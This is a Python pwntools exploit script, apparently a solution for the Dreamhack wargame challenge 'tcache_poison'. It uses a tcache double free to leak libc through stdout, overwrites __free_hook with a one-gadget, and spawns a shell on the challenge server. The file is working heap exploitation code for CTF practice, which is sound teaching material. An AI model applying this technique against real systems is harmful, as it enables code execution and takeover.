# Name: tcache_poison.py
#!/usr/bin/python3
from pwn import *

p = remote("host1.dreamhack.games", 9334)
# p = process("./tcache_poison")
e = ELF("./tcache_poison")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

def alloc(size, data):
    p.sendlineafter("Edit\n", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)

def free():
    p.sendlineafter("Edit\n", "2")

def print_chunk():
    p.sendlineafter("Edit\n", "3")

def edit(data):
    p.sendlineafter("Edit\n", "4")
    p.sendafter(":", data)

# [1]Tcache Posioning
alloc(0x30, "juntheworld")
free()

edit("AAAAAAAA"+"\x00")
free()

#[2]Posion Chunk realloc
stdout_ptr = e.symbols["stdout"]
slog("stdout_ptr", stdout_ptr)

alloc(0x30, p64(stdout_ptr))

alloc(0x30, "BBBBBBBB")
alloc(0x30, "\x60")
# alloc(0x30, "\x0a") for libc-2.31.so

print_chunk()
p.recvuntil("Content: ")
stdout = u64(p.recv(6)+b"\x00"*2)
slog("stdout", stdout)

lb = stdout - libc.symbols["_IO_2_1_stdout_"]
# lb = stdout - libc.symbols["stdout"]
hook = lb + libc.symbols["__free_hook"]
og = lb + 0x4f432

slog("libc_base", lb)
slog("free_hook", hook)
slog("og", og)

alloc(0x40, "attack")
free()

edit("AAAAAAAA"+"\x00")
free()

alloc(0x40, p64(hook))
alloc(0x40, "BBBBBBBB")
alloc(0x40, p64(og))

free()

p.interactive()